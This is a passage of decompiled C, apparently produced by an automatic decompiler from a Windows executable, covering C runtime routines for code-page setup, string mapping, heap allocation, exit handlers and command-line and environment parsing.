				edi_195->b0000 = (byte) 0x00;
				++edi_195;
			}
			edi_195->b0000 = 0x00;
			g_t494E64.u0 = 0x00;
			if (tLoc1C.MaxCharSize > 0x01)
			{
				if (Mem204[&tLoc1C + 6:byte] != 0x00)
				{
					struct Eq_5267 * ecx_210 = tLoc1C.LeadByte + 1;
					do
					{
						byte dl_213 = ecx_210->b0000;
						if (dl_213 == 0x00)
							break;
						struct Eq_5271 * eax_218;
						struct Eq_5271 * edx_219 = (word32) dl_213;
						for (eax_218 = (word32) ecx_210->bFFFFFFFF; eax_218 <= edx_219; ++eax_218)
							eax_218[0x00494D61] = (struct Eq_5271) (eax_218[0x00494D61] | 0x04);
						byte * ecx_225 = ecx_210 + 1;
						ecx_210 = (struct Eq_5267 *) (ecx_225 + 1);
					} while (*ecx_225 != 0x00);
				}
				struct Eq_5265 * eax_236 = (struct Eq_5265 *) 0x01;
				do
				{
					eax_236[0x00494D61] = (struct Eq_5265) (eax_236[0x00494D61] | 0x08);
					++eax_236;
				} while (eax_236 < (struct Eq_5265 *) 0xFF);
				g_t494E64.u0 = (BOOL) fn0040877A(eax_22);
				g_dw494C4C = 0x01;
			}
			else
				g_dw494C4C = 0x00;
			g_dw494C40 = 0x00;
			g_dw494C44 = 0x00;
			g_dw494C48 = 0x00;
l0040871F:
			fn004087D6();
			return;
		}
		if (g_dw49392C == 0x00)
			return;
	}
	fn004087AD();
	goto l0040871F;
}

// 00408730: Register Eq_2 fn00408730(Stack Eq_2 dwArg04)
// Called from:
//      fn00408597
Eq_2 fn00408730(Eq_2 dwArg04)
{
	g_dw49392C = 0x00;
	Eq_2 eax_15 = dwArg04;
	switch (dwArg04)
	{
	case ~0x01:
		g_dw49392C = 0x01;
		return GetOEMCP();
	case ~0x02:
		g_dw49392C = 0x01;
		return GetACP();
	default:
		if (dwArg04 == ~0x03)
		{
			&eax_15.u0->dw0000 = g_t49394C.u0;
			g_dw49392C = 0x01;
		}
		return eax_15;
	}
}

// 0040877A: Register word32 fn0040877A(Stack Eq_2 dwArg04)
// Called from:
//      fn00408597
word32 fn0040877A(Eq_2 dwArg04)
{
	if (dwArg04 == 0x03A4)
		return 0x0411;
	if (dwArg04 == 0x03A8)
		return 0x0804;
	if (dwArg04 == 949)
		return 0x0412;
	if (dwArg04 == 0x03B6)
		return 0x0404;
	return 0x00;
}

// 004087AD: void fn004087AD()
// Called from:
//      fn00408597
void fn004087AD()
{
	word32 ecx_16;
	struct Eq_5476 * edi_15 = g_a494D60;
	for (ecx_16 = 0x40; ecx_16 != 0x00; --ecx_16)
	{
		edi_15->b0000 = (byte) 0x00;
		++edi_15;
	}
	edi_15->b0000 = 0x00;
	g_t494C38.u0 = 0x00;
	g_dw494C4C = 0x00;
	g_t494E64.u0 = 0x00;
	g_dw494C40 = 0x00;
	g_dw494C44 = 0x00;
	g_dw494C48 = 0x00;
}

// 004087D6: void fn004087D6()
// Called from:
//      fn00408597
void fn004087D6()
{
	ptr32 fp;
	Eq_4352 tLoc0518;
	Eq_1281 tLoc0318;
	Eq_1281 tLoc0218;
	Eq_5511 tLoc18;
	if (GetCPInfo(g_t494C38.u0, &tLoc18) == 0x01)
	{
		Eq_5523 eax_494 = 0x00;
		do
		{
			byte al_76 = (byte) eax_502;
			*((word32) eax_502 + (fp - 0x0118)) = al_76;
			eax_494 = SEQ(SLICE((word32) eax_502 + 1, word24, 8), al_76 + 0x01);
			eax_502 = eax_494;
		} while (eax_502 < 0xFF);
		BYTE al_104[12] = tLoc18.LeadByte[0];
		if (al_104 != 0x00)
		{
			byte * edx_100 = tLoc18.LeadByte + 1;
			do
			{
				Eq_5610 ecx_103 = (word32) *edx_100;
				Eq_5610 eax_105 = (word32) al_104;
				if (eax_105 <= ecx_103)
				{
					word32 ecx_108 = ecx_103 - eax_105;
					struct Eq_5613 * edi_110 = (word32) eax_105 + (fp - 0x0118);
					uint32 ecx_114;
					for (ecx_114 = ecx_108 + 0x01 >> 0x02; ecx_114 != 0x00; --ecx_114)
					{
						edi_110->dw0000 = 0x20202020;
						edi_110 += 4;
					}
					ui32 ecx_119;
					for (ecx_119 = ecx_108 + 0x01 & 0x03; ecx_119 != 0x00; --ecx_119)
					{
						edi_110->dw0000 = (word32) 0x20;
						++edi_110;
					}
				}
				BYTE edx_126[12] = edx_100 + 1;
				edx_100 = (byte *) (edx_126 + 1);
				al_104 = (BYTE[12]) edx_126[0];
			} while (al_104 != 0x00);
		}
		fn0040AE68(0x01, fp - 0x0118, 0x0100, &tLoc0518, g_t494C38.u0, g_t494E64.u0, 0x00);
		word32 ecx_500;
		fn00408A01(g_t494E64.u0, 0x0100, fp - 0x0118, 0x0100, &tLoc0218, 0x0100, g_t494C38.u0, 0x00, out ecx_500);
		word32 ecx_501;
		fn00408A01(g_t494E64.u0, 0x0200, fp - 0x0118, 0x0100, &tLoc0318, 0x0100, g_t494C38.u0, 0x00, out ecx_501);
		struct Eq_5591 * eax_239 = null;
		union Eq_5593 * ecx_243 = &tLoc0518;
		do
		{
			byte dl_268;
			byte dl_247 = ecx_243->u0;
			if ((dl_247 & 0x01) != 0x00)
			{
				eax_239[0x00494D61] = (struct Eq_5591) (eax_239[0x00494D61] | 0x10);
				dl_268 = Mem270[&tLoc0218 + eax_239:byte];
				goto l004088E2;
			}
			if ((dl_247 & 0x02) != 0x00)
			{
				eax_239[0x00494D61] = (struct Eq_5591) (eax_239[0x00494D61] | 0x20);
				dl_268 = Mem263[&tLoc0318 + eax_239:byte];
l004088E2:
				eax_239[4803680] = (struct Eq_5591) dl_268;
			}
			else
				eax_239[4803680] = (struct Eq_5591) 0x00;
			++eax_239;
			ecx_243 = (union Eq_5593 *) ((char *) ecx_243 + 2);
		} while (eax_239 < (struct Eq_5591 *) 0x0100);
	}
	else
	{
		struct Eq_5521 * eax_22 = null;
		do
		{
			byte cl_51;
			byte al_49 = (byte) eax_22;
			if (eax_22 >= (struct Eq_5521 *) 0x41 && eax_22 <= (struct Eq_5521 *) 0x5A)
			{
				eax_22[0x00494D61] = (struct Eq_5521) (eax_22[0x00494D61] | 0x10);
				cl_51 = al_49 + 0x20;
				goto l0040892C;
			}
			if (eax_22 >= (struct Eq_5521 *) 0x61 && eax_22 <= (struct Eq_5521 *) 122)
			{
				eax_22[0x00494D61] = (struct Eq_5521) (eax_22[0x00494D61] | 0x20);
				cl_51 = al_49 - 0x20;
l0040892C:
				eax_22[4803680] = (struct Eq_5521) cl_51;
			}
			else
				eax_22[4803680] = (struct Eq_5521) 0x00;
			++eax_22;
		} while (eax_22 < (struct Eq_5521 *) 0x0100);
	}
}

// 0040895B: void fn0040895B()
// Called from:
//      fn0040A492
//      fn0040A4EA
//      fn0040A5A3
void fn0040895B()
{
	if (g_dw494C28 == 0x00)
	{
		fn00408597(~0x02);
		g_dw494C28 = 0x01;
	}
}

// 00408977: Register Eq_2 fn00408977(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack (ptr32 (arr byte)) dwArg0C)
// Called from:
//      fn004078BB
Eq_2 fn00408977(Eq_2 dwArg04, Eq_2 dwArg08, byte (* dwArg0C)[])
{
	Eq_2 ecx;
	Eq_2 edi_108 = dwArg04;
	if (g_dw494C4C == 0x00)
		ecx = fn0040AFC0(dwArg04, dwArg08, dwArg0C);
	else
	{
		byte (* edx_15)[] = dwArg0C;
		if (dwArg0C != null)
		{
			ecx = dwArg08;
			do
			{
				byte al_26 = ecx.u2->u0;
				edi_108.u2->u0 = al_26;
				--edx_15;
				if ((g_a494D61[(word32) al_26] & 0x04) != 0x00)
				{
					&edi_108.u0->dw0000 = &edi_108.u5->b0001;
					&ecx.u0->dw0000 = &ecx.u5->b0001;
					if (edx_15 == null)
					{
						&((word32) edi_108 - 1)->u0->dw0000 = 0x00;
						break;
					}
					byte al_53 = ecx.u2->u0;
					edi_108.u2->u0 = al_53;
					--edx_15;
					&edi_108.u0->dw0000 = &edi_108.u5->b0001;
					&ecx.u0->dw0000 = &ecx.u5->b0001;
					if (al_53 == 0x00)
					{
						&((word32) edi_108 - 1)->u0->dw0000 = 0x00;
						break;
					}
				}
				else
				{
					&edi_108.u0->dw0000 = &edi_108.u5->b0001;
					&ecx.u0->dw0000 = &ecx.u5->b0001;
					if (al_26 == 0x00)
						break;
				}
			} while (edx_15 != null);
		}
		word32 edx_74 = edx_15 - 0x01;
		if (edx_15 != null)
		{
			uint32 ecx_116;
			for (ecx_116 = edx_74 + 1 >> 0x02; ecx_116 != 0x00; --ecx_116)
			{
				edi_108.u0->dw0000 = 0x00;
				&edi_108.u0->dw0000 = &edi_108.u0->dw0004;
			}
			for (ecx = edx_74 + 1 & 0x03; ecx != 0x00; --ecx)
			{
				edi_108.u2->u0 = 0x00;
				&edi_108.u0->dw0000 = &edi_108.u5->b0001;
			}
		}
	}
	return ecx;
}

// 00408A01: Register Eq_2 fn00408A01(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10, Stack Eq_2 dwArg14, Stack Eq_2 dwArg18, Stack Eq_2 dwArg1C, Stack word32 dwArg20, Register out ptr32 ecxOut)
// Called from:
//      fn00407ACE
//      fn004087D6
//      fn0040C9AC
Eq_2 fn00408A01(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10, Eq_2 dwArg14, Eq_2 dwArg18, Eq_2 dwArg1C, word32 dwArg20, ptr32 & ecxOut)
{
	ptr32 fp;
	struct Eq_5855 * fs;
	byte bArg09_441 = SLICE(dwArg08, byte, 8);
	Eq_2 eax_330;
	ptr32 eax_15 = fs->ptr0000;
	fs->ptr0000 = fp - 20;
	if (g_dw493930 == 0x00)
	{
		if (LCMapStringW(0x00, 0x0100, 4248144, 0x01, 0x00, 0x00) != 0x00)
			g_dw493930 = 0x01;
		else
		{
			if (LCMapStringA(0x00, 0x0100, 4248140, 0x01, 0x00, 0x00) == 0x00)
				goto l00408B8F;
			g_dw493930 = 0x02;
		}
	}
	if (dwArg10 > 0x00)
		dwArg10 = fn00408C25(dwArg0C, dwArg10);
	word32 eax_102 = g_dw493930;
	if (eax_102 == 0x02)
	{
		eax_330 = LCMapStringA(dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18);
		goto l00408B91;
	}
	if (eax_102 == 0x01)
	{
		if (dwArg1C == 0x00)
			&dwArg1C.u0->dw0000 = g_t49394C.u0;
		Eq_2 eax_138 = MultiByteToWideChar(dwArg1C, (0x00 - (dwArg20 != 0x00) & 0x08) + 0x01, dwArg0C, dwArg10, 0x00, 0x00);
		if (eax_138 == 0x00)
			goto l00408B8F;
		ui32 eax_146 = eax_138 * 0x02 + 0x03;
		fn00407F60(SEQ(SLICE(eax_146, word24, 8), (byte) eax_146 & 252), 0x00);
		Eq_2 esp_155 = (struct Eq_10346 *) <invalid>;
		if (esp_155 == 0x00)
			goto l00408B8F;
		esp_155.u0->dwFFFFFFFC = (word32) eax_138;
		esp_155.u0->dwFFFFFFF8 = (word32) esp_155;
		*((word32) esp_155 - 0x0C) = dwArg10;
		*((word32) esp_155 - 16) = dwArg0C;
		&((word32) esp_155 - 20)->u0->dw0000 = 0x01;
		*((word32) esp_155 - 24) = dwArg1C;
		if (MultiByteToWideChar(*((word32) esp_155 - 24), *((word32) esp_155 - 20), *((word32) esp_155 - 16), *((word32) esp_155 - 0x0C), esp_155.u0->dwFFFFFFF8, esp_155.u0->dwFFFFFFFC) != 0x00)
		{
			esp_155.u0->dwFFFFFFFC = 0x00;
			esp_155.u0->dwFFFFFFF8 = 0x00;
			*((word32) esp_155 - 0x0C) = eax_138;
			*((word32) esp_155 - 16) = esp_155;
			*((word32) esp_155 - 20) = dwArg08;
			*((word32) esp_155 - 24) = dwArg04;
			Eq_2 eax_208 = LCMapStringW(*((word32) esp_155 - 24), *((word32) esp_155 - 20), *((word32) esp_155 - 16), *((word32) esp_155 - 0x0C), esp_155.u0->dwFFFFFFF8, esp_155.u0->dwFFFFFFFC);
			Eq_2 esi_210 = eax_208;
			if (eax_208 == 0x00)
				goto l00408B8F;
			if ((bArg09_441 & 0x04) != 0x00)
			{
				if (dwArg18 != 0x00)
				{
					if (eax_208 > dwArg18)
						goto l00408B8F;
					esp_155.u0->dwFFFFFFFC = (word32) dwArg18;
					esp_155.u0->dwFFFFFFF8 = (word32) dwArg14;
					*((word32) esp_155 - 0x0C) = eax_138;
					*((word32) esp_155 - 16) = esp_155;
					*((word32) esp_155 - 20) = dwArg08;
					*((word32) esp_155 - 24) = dwArg04;
					if (LCMapStringW(*((word32) esp_155 - 24), *((word32) esp_155 - 20), *((word32) esp_155 - 16), *((word32) esp_155 - 0x0C), esp_155.u0->dwFFFFFFF8, esp_155.u0->dwFFFFFFFC) == 0x00)
						goto l00408B8F;
				}
			}
			else
			{
				ui32 eax_220 = eax_208 * 0x02 + 0x03;
				fn00407F60(SEQ(SLICE(eax_220, word24, 8), (byte) eax_220 & 252), esp_155.u0->dwFFFFFFFC);
				Eq_2 esp_229 = (struct Eq_10346 *) <invalid>;
				if (esp_229 == 0x00)
					goto l00408B8F;
				esp_229.u0->dwFFFFFFFC = (word32) eax_208;
				esp_229.u0->dwFFFFFFF8 = (word32) esp_229;
				*((word32) esp_229 - 0x0C) = eax_138;
				*((word32) esp_229 - 16) = esp_155;
				*((word32) esp_229 - 20) = dwArg08;
				*((word32) esp_229 - 24) = dwArg04;
				if (LCMapStringW(*((word32) esp_229 - 24), *((word32) esp_229 - 20), *((word32) esp_229 - 16), *((word32) esp_229 - 0x0C), esp_229.u0->dwFFFFFFF8, esp_229.u0->dwFFFFFFFC) == 0x00)
					goto l00408B8F;
				esp_229.u0->dwFFFFFFFC = 0x00;
				esp_229.u0->dwFFFFFFF8 = 0x00;
				if (dwArg18 == 0x00)
				{
					&((word32) esp_229 - 0x0C)->u0->dw0000 = 0x00;
					&((word32) esp_229 - 16)->u0->dw0000 = 0x00;
				}
				else
				{
					*((word32) esp_229 - 0x0C) = dwArg18;
					*((word32) esp_229 - 16) = dwArg14;
				}
				*((word32) esp_229 - 20) = eax_208;
				*((word32) esp_229 - 24) = esp_229;
				&((word32) esp_229 - 28)->u0->dw0000 = 0x0220;
				*((word32) esp_229 - 32) = dwArg1C;
				Eq_2 eax_296 = WideCharToMultiByte(*((word32) esp_229 - 32), *((word32) esp_229 - 28), *((word32) esp_229 - 24), *((word32) esp_229 - 20), *((word32) esp_229 - 16), *((word32) esp_229 - 0x0C), esp_229.u0->dwFFFFFFF8, esp_229.u0->dwFFFFFFFC);
				esi_210 = eax_296;
				if (eax_296 == 0x00)
					goto l00408B8F;
			}
			eax_330 = esi_210;
l00408B91:
			fs->ptr0000 = eax_15;
			ecxOut = eax_15;
			return eax_330;
		}
	}
l00408B8F:
	&eax_330.u0->dw0000 = 0x00;
	goto l00408B91;
}

// 00408C25: Register Eq_2 fn00408C25(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00408A01
Eq_2 fn00408C25(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2 eax_15 = dwArg04;
	word32 ecx_13 = dwArg08 - 1;
	if (dwArg08 != 0x00)
	{
		while (eax_15.u2->u0 != 0x00)
		{
			&eax_15.u0->dw0000 = &eax_15.u5->b0001;
			ecx_13 = ecx_72 - 0x01;
			ecx_72 = ecx_13;
			if (ecx_72 == 0x00)
				break;
		}
	}
	if (eax_15.u2->u0 != 0x00)
		return dwArg08;
	return eax_15 - dwArg04;
}

// 00408C50: Register ui32 fn00408C50(Stack Eq_4295 dwArg04, Stack Eq_4352 tArg06, Stack ui32 dwArg08)
// Called from:
//      fn00407ACE
ui32 fn00408C50(Eq_4295 dwArg04, Eq_4352 tArg06, ui32 dwArg08)
{
	ptr32 fp;
	ui32 eax_83;
	if (dwArg04 > 0xFF)
	{
		Eq_2 dwLoc0C_106;
		if ((g_ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
			&dwLoc0C_106.u0->dw0000 = 0x02;
		else
			&dwLoc0C_106.u0->dw0000 = 0x01;
		ui32 eax_70 = fn0040AE68(0x01, fp - 8, dwLoc0C_106, &tArg06, 0x00, 0x00, 0x01);
		if (eax_70 == 0x00)
			return eax_70;
		eax_83 = (word32) tArg06;
		return eax_83 & dwArg08;
	}
	else
	{
		eax_83 = (word32) g_ptr412A10[dwArg04].t0000.u1;
		return eax_83 & dwArg08;
	}
}

// 004095E4: Register word32 fn004095E4(Stack Eq_2 dwArg04, Register out (ptr32 word32) ebpOut)
// Called from:
//      fn00407BEB
//      fn0040A4EA
//      fn0040A7F0
//      fn0040C9AC
word32 fn004095E4(Eq_2 dwArg04, word32 & ebpOut)
{
	word32 * ebp;
	word32 ebx;
	if (dwArg04 != 0x00)
	{
		Eq_2 eax_14 = fn0040B5B3(dwArg04);
		if (eax_14 != 0x00)
		{
			word32 * ebp_47;
			word32 ebx_43 = fn0040B5DE(eax_14, dwArg04, out ebp_47);
			ebpOut = ebp_47;
			return ebx_43;
		}
		HeapFree(g_t494B04.u0, 0x00, dwArg04);
	}
	ebpOut = ebp;
	return ebx;
}

// 00409613: Register word32 fn00409613(Stack Eq_2 dwArg04)
// Called from:
//      fn0040A4EA
//      fn0040A5A3
//      fn0040A7F0
//      fn0040A922
//      fn0040C9AC
word32 fn00409613(Eq_2 dwArg04)
{
	return fn00409625(dwArg04, g_dw493AB8);
}

// 00409625: Register word32 fn00409625(Stack Eq_2 dwArg04, Stack word32 dwArg08)
// Called from:
//      fn00407F8F
//      fn00409613
word32 fn00409625(Eq_2 dwArg04, word32 dwArg08)
{
	word32 eax_12;
	if (dwArg04 <= ~0x1F)
	{
		do
		{
			eax_12 = fn00409651(dwArg04);
			if (eax_12 != 0x00 || dwArg08 == eax_12)
				return eax_12;
		} while (fn0040BDBE(dwArg04) != 0x00);
	}
	eax_12 = 0x00;
	return eax_12;
}

// 00409651: Register Eq_2 fn00409651(Stack Eq_2 dwArg04)
// Called from:
//      fn00409625
Eq_2 fn00409651(Eq_2 dwArg04)
{
	Eq_2 eax_12;
	Eq_2 esi_34 = dwArg04;
	if (dwArg04 <= g_t413020.u0)
	{
		eax_12 = fn0040B909(dwArg04);
		if (eax_12 != 0x00)
			return eax_12;
	}
	if (dwArg04 == 0x00)
		&esi_34.u0->dw0000 = 0x01;
	eax_12 = HeapAlloc(g_t494B04.u0, 0x00, (word32) esi_34 + 0x0F & ~0x0F);
	return eax_12;
}

// 0040A20C: void fn0040A20C()
// Called from:
//      Win32CrtStartup
void fn0040A20C()
{
	<anonymous> * eax_5 = g_ptr494C34;
	if (eax_5 != null)
		eax_5();
	fn0040A2F4(&g_dw40F008, &g_dw40F014);
	fn0040A2F4(&g_dw40F000, &g_dw40F004);
}

// 0040A239: void fn0040A239(Stack Eq_2 dwArg04)
// Called from:
//      Win32CrtStartup
void fn0040A239(Eq_2 dwArg04)
{
	fn0040A25B(dwArg04, 0x00, 0x00);
}

<anonymous> g_t40A24A = <code>; // 0040A24A
// 0040A25B: void fn0040A25B(Stack Eq_2 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
// Called from:
//      fn0040A239
void fn0040A25B(Eq_2 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	ptr32 fp;
	if (g_dw49399C == 0x01)
		TerminateProcess(GetCurrentProcess(), dwArg04);
	g_dw493998 = 0x01;
	g_b493994 = (byte) dwArg0C;
	ptr32 esp_24 = fp - 8;
	if (dwArg08 == 0x00)
	{
		word32 * eax_34 = g_ptr494C30;
		if (eax_34 != null)
		{
			up32 ecx_39 = g_dw494C2C;
			ptr32 esp_40 = fp - 0x0C;
			word32 * esi_44 = ecx_39 - 4;
			if (ecx_39 - 4 >= eax_34)
			{
				do
				{
					<anonymous> * eax_49 = *esi_44;
					if (eax_49 != null)
					{
						word32 eax_59;
						eax_49();
					}
					esi_44 -= 0x04;
				} while (esi_44 >= g_ptr494C30);
			}
			esp_24 = esp_40 + 4;
		}
		struct Eq_6479 * esp_74 = esp_24 - 4;
		esp_74->ptr0000 = &g_dw40F020;
		esp_74->ptrFFFFFFFC = &g_dw40F018;
		fn0040A2F4(esp_74->ptrFFFFFFFC, esp_74->ptr0000);
	}
	fn0040A2F4(&g_dw40F024, &g_dw40F028);
	if (dwArg0C != 0x00)
		return;
	g_dw49399C = 0x01;
	ExitProcess(dwArg04);
}

// 0040A2F4: void fn0040A2F4(Stack (ptr32 word32) dwArg04, Stack (ptr32 word32) dwArg08)
// Called from:
//      fn0040A20C
//      fn0040A25B
void fn0040A2F4(word32 * dwArg04, word32 * dwArg08)
{
	word32 * esi_26;
	for (esi_26 = dwArg04; esi_26 < dwArg08; ++esi_26)
	{
		<anonymous> * eax_15 = *esi_26;
		if (eax_15 != null)
		{
			word32 eax_22;
			eax_15();
		}
	}
}

// 0040A30E: Register Eq_2 fn0040A30E(Stack word32 dwArg04, Stack (ptr32 Eq_5136) dwArg08)
// Called from:
//      Win32CrtStartup
Eq_2 fn0040A30E(word32 dwArg04, struct _EXCEPTION_POINTERS * dwArg08)
{
	Eq_2 eax_152;
	struct Eq_6541 * eax_14 = fn0040A44F(dwArg04);
	if (eax_14 != null)
	{
		<anonymous> * ebx_27 = eax_14->ptr0008;
		if (ebx_27 != null)
		{
			if (ebx_27 == (<anonymous> *) 0x05)
			{
				eax_14->ptr0008 = null;
				&eax_152.u0->dw0000 = 0x01;
			}
			else
			{
				if (ebx_27 != (<anonymous> *) 0x01)
				{
					struct _EXCEPTION_POINTERS * ecx_44 = g_ptr4939A0;
					g_ptr4939A0 = dwArg08;
					word32 ecx_48 = eax_14->dw0004;
					if (ecx_48 == 0x08)
					{
						int32 ecx_66 = g_dw412CB8;
						int32 edx_68 = g_dw412CBC + ecx_66;
						if (ecx_66 < edx_68)
						{
							int32 edx_75 = edx_68 - ecx_66;
							struct Eq_6601 * esi_77 = ecx_66 * 0x0C + 4271176;
							do
							{
								esi_77->dw0000 = 0x00;
								++esi_77;
								--edx_75;
							} while (edx_75 != 0x00);
						}
						word32 eax_92 = eax_14->dw0000;
						word32 esi_93 = g_dw412CC4;
						if (eax_92 == 0xC000008E)
							g_dw412CC4 = 131;
						else if (eax_92 == 0xC0000090)
							g_dw412CC4 = 0x81;
						else if (eax_92 == 0xC0000091)
							g_dw412CC4 = 0x84;
						else if (eax_92 == 0xC0000093)
							g_dw412CC4 = 133;
						else if (eax_92 == 0xC000008D)
							g_dw412CC4 = 0x82;
						else if (eax_92 == 0xC000008F)
							g_dw412CC4 = 0x86;
						else if (eax_92 == 0xC0000092)
							g_dw412CC4 = 0x8A;
						ebx_27();
						g_dw412CC4 = esi_93;
					}
					else
					{
						eax_14->ptr0008 = null;
						ebx_27();
					}
					g_ptr4939A0 = ecx_44;
				}
				&eax_152.u0->dw0000 = ~0x00;
			}
			return eax_152;
		}
	}
	eax_152 = UnhandledExceptionFilter(dwArg08);
	return eax_152;
}

// 0040A44F: Register (ptr32 Eq_6644) fn0040A44F(Stack word32 dwArg04)
// Called from:
//      fn0040A30E
struct Eq_6644 * fn0040A44F(word32 dwArg04)
{
	ui32 ecx_6 = g_dw412CC0;
	struct Eq_6644 * eax_11 = &g_dw412C40;
	if (g_dw412C40 != dwArg04)
	{
		struct Eq_6644 * esi_14 = ecx_6 * 0x0C + 0x00412C40;
		do
			++eax_11;
		while (eax_11 < esi_14 && eax_11->dw0000 != dwArg04);
	}
	if (eax_11 >= ecx_6 * 0x0C + 0x00412C40 || eax_11->dw0000 != dwArg04)
		eax_11 = null;
	return eax_11;
}

// 0040A492: Register Eq_2 fn0040A492()
// Called from:
//      Win32CrtStartup
Eq_2 fn0040A492()
{
	if (g_dw494C28 == 0x00)
		fn0040895B();
	Eq_2 esi_20 = g_t494E68.u0;
	cu8 al_21 = esi_20.u2->u0;
	if (al_21 == 0x22)
	{
		while (true)
		{
			byte al_33 = esi_20.u5->b0001;
			&esi_20.u0->dw0000 = &esi_20.u5->b0001;
			if (al_33 == 0x22 || al_33 == 0x00)
				break;
			if (fn0040C056(al_33) != 0x00)
				&esi_20.u0->dw0000 = &esi_20.u5->b0001;
		}
		if (esi_20.u2->u0 == 0x22)
		{
l0040A4CF:
			&esi_20.u0->dw0000 = &esi_20.u5->b0001;
		}
	}
	else if (al_21 > 0x20)
	{
		do
			&esi_20.u0->dw0000 = &esi_20.u5->b0001;
		while (esi_20.u2->u0 > 0x20);
	}
	cu8 al_51 = esi_20.u2->u0;
	if (al_51 == 0x00 || al_51 > 0x20)
		return esi_20;
	goto l0040A4CF;
}

// 0040A4EA: Register word32 fn0040A4EA()
// Called from:
//      Win32CrtStartup
word32 fn0040A4EA()
{
	if (g_dw494C28 == 0x00)
		fn0040895B();
	Eq_2 esi_212 = g_t493920.u0;
	ui32 edi_196 = 0x00;
	while (true)
	{
		byte al_32 = esi_212.u2->u0;
		if (al_32 == 0x00)
			break;
		if (al_32 != 0x3D)
			++edi_196;
		esi_212 = esi_212 + 1 + fn00407840(esi_212);
	}
	Eq_2 eax_41 = fn00409613(edi_196 * 0x04 + 0x04);
	g_t49397C.u0 = (BOOL) eax_41;
	Eq_2 esi_112 = eax_41;
	if (eax_41 == 0x00)
		fn0040854E(0x09);
	Eq_2 edi_119 = g_t493920.u0;
	while (edi_119.u2->u0 != 0x00)
	{
		Eq_2 eax_84 = fn00407840(edi_119);
		if (edi_119.u2->u0 != 0x3D)
		{
			Eq_2 eax_100 = fn00409613(&eax_84.u5->b0001);
			esi_112.u0->dw0000 = (word32) eax_100;
			if (eax_100 == 0x00)
				edi_119 = fn0040854E(0x09);
			edi_119 = fn00407750(esi_112.u0->dw0000, edi_119);
			&esi_112.u0->dw0000 = &esi_112.u0->dw0004;
		}
		edi_119 += eax_84 + 0x01;
	}
	word32 ebp_172;
	Eq_2 ebx_173 = fn004095E4(g_t493920.u0, out ebp_172);
	g_t493920.u0 = (BOOL) ebx_173;
	esi_112.u0->dw0000 = (word32) ebx_173;
	g_dw494C24 = 0x01;
	return ebp_172;
}

// 0040A5A3: void fn0040A5A3(Register word32 ecx)
// Called from:
//      Win32CrtStartup
void fn0040A5A3(word32 ecx)
{
	Eq_6829 tLoc0C;
	Eq_6830 tLoc08;
	tLoc08 = (Eq_6830) ecx;
	tLoc0C = (Eq_6829) ecx;
	if (g_dw494C28 == 0x00)
		fn0040895B();
	GetModuleFileNameA(0x00, 4798884, 0x0104);
	Eq_2 eax_44 = g_t494E68.u0;
	g_dw49398C = 4798884;
	Eq_2 edi_122 = 4798884;
	if (eax_44.u2->u0 != 0x00)
		edi_122 = eax_44;
	fn0040A63C(edi_122, 0x00, null, &tLoc08, &tLoc0C);
	Eq_2 eax_81 = fn00409613((word32) tLoc0C + tLoc08 * 0x04);
	if (eax_81 == 0x00)
		edi_122 = fn0040854E(0x08);
	fn0040A63C(edi_122, eax_81, eax_81.u0 + (tLoc08 * 0x04) / 0x00001000, &tLoc08, &tLoc0C);
	word32 eax_132 = tLoc08;
	g_t493974.u0 = (BOOL) eax_81;
	g_dw493970 = eax_132 - 0x01;
}

// 0040A63C: void fn0040A63C(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack (ptr32 Eq_6869) dwArg0C, Stack (ptr32 word32) dwArg10, Stack (ptr32 word32) dwArg14)
// Called from:
//      fn0040A5A3
void fn0040A63C(Eq_2 dwArg04, Eq_2 dwArg08, struct Eq_6869 * dwArg0C, word32 * dwArg10, word32 * dwArg14)
{
	*dwArg14 = 0x00;
	*dwArg10 = 0x01;
	struct Eq_6869 * esi_127 = dwArg0C;
	Eq_2 edi_178 = dwArg08;
	Eq_2 eax_107 = dwArg04;
	if (dwArg08 != 0x00)
	{
		dwArg08.u0->dw0000 = dwArg0C;
		&edi_178.u0->dw0000 = &dwArg08.u0->dw0004;
		&dwArg08.u0->dw0000 = &dwArg08.u0->dw0004;
	}
	if (dwArg04.u2->u0 == 0x22)
	{
		while (true)
		{
			byte dl_113 = eax_107.u5->b0001;
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
			if (dl_113 == 0x22 || dl_113 == 0x00)
				break;
			if ((g_a494D61[(word32) dl_113] & 0x04) != 0x00)
			{
				++*dwArg14;
				if (esi_127 != null)
				{
					esi_127->b0000 = eax_107.u2->u0;
					++esi_127;
					&eax_107.u0->dw0000 = &eax_107.u5->b0001;
				}
			}
			++*dwArg14;
			if (esi_127 != null)
			{
				esi_127->b0000 = eax_107.u2->u0;
				++esi_127;
			}
		}
		++*dwArg14;
		if (esi_127 != null)
		{
			esi_127->b0000 = 0x00;
			++esi_127;
		}
		if (eax_107.u2->u0 == 0x22)
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
	}
	else
	{
		do
		{
			++*dwArg14;
			if (esi_127 != null)
			{
				esi_127->b0000 = eax_107.u2->u0;
				++esi_127;
			}
			byte dl_54 = eax_107.u2->u0;
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
			if ((g_a494D61[(word32) dl_54] & 0x04) != 0x00)
			{
				++*dwArg14;
				if (esi_127 != null)
				{
					esi_127->b0000 = eax_107.u2->u0;
					++esi_127;
				}
				&eax_107.u0->dw0000 = &eax_107.u5->b0001;
			}
			if (dl_54 == 0x20)
				break;
			if (dl_54 == 0x00)
				goto l0040A6E7;
		} while (dl_54 != 0x09);
		if (dl_54 == 0x00)
		{
l0040A6E7:
			--eax_107;
		}
		else if (esi_127 != null)
			esi_127->bFFFFFFFF = 0x00;
	}
	uint32 dwArg14_549 = 0x00;
	while (eax_107.u2->u0 != 0x00)
	{
		while (true)
		{
			byte dl_169 = eax_107.u2->u0;
			if (dl_169 != 0x20 && dl_169 != 0x09)
				break;
			&eax_107.u0->dw0000 = &eax_107.u5->b0001;
